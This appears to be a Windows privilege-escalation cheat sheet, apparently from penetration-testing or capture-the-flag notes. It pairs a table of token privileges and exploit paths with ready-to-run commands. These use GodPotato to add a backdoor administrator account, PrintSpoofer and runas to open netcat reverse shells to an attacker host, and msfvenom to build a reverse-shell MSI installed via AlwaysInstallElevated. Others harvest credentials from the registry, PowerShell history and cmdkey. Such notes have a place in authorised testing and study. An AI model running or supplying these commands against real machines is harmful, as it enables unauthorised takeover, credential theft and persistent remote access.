#### Token Privileges (whoami /priv)

| Privilege              | Exploit Path                                      |
| ---------------------- | ------------------------------------------------- |
| SeImpersonatePrivilege | GodPotato / PrintSpoofer / JuicyPotatoNG → SYSTEM |
| SeAssignPrimaryToken   | GodPotato / JuicyPotato → SYSTEM                  |
| SeBackupPrivilege      | Read SAM/NTDS → dump hashes                       |
| SeDebugPrivilege       | Dump LSASS → hashes                               |
| SeLoadDriverPrivilege  | Load malicious driver → SYSTEM                    |
```
# GodPotato (SeImpersonate):
.\GodPotato-NET4.exe -cmd "cmd /c net user hax Password123! /add && net localgroup administrators hax /add"

# PrintSpoofer:
.\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe <LHOST> 4444 -e cmd"

# AlwaysInstallElevated (check BOTH keys = 1):
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f msi -o evil.msi
msiexec /quiet /qn /i C:\Temp\evil.msi

# Autologon creds in registry:
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# PowerShell history (GOLD MINE):
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Stored credentials:
cmdkey /list
runas /savecred /user:Administrator "C:\Temp\nc.exe <LHOST> 4444 -e cmd"  # needs ncat/ncat build

# Unquoted service paths:
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"
```